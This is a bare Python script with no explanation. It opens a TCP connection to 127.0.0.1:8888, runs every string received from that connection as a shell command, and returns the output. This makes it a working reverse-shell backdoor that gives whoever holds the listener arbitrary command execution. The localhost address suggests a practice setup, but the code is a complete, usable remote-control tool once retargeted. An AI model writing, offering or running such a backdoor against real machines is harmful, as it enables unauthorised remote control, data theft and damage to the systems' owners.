from socket import socket, AF_INET, SOCK_STREAM
import threading
import subprocess

def receive_message(client_socket):
    while True:
        data = client_socket.recv(20241).decode()
        if not data:
            break
        try:
            result = subprocess.run(
                data,
                shell=True,          
                capture_output=True,
                text=True,
                timeout=15
            )
            output = result.stdout + result.stderr
            if not output.strip():
                output = "(command ran, no output)"
        except Exception as e:
            output = f"error running command: {e}"

        client_socket.sendall(output.encode())

with socket(AF_INET, SOCK_STREAM) as client_socket:
    client_socket.connect(("127.0.0.1", 8888))
    threading.Thread(target=receive_message, args=(client_socket,)).start()
    while True:
        pass 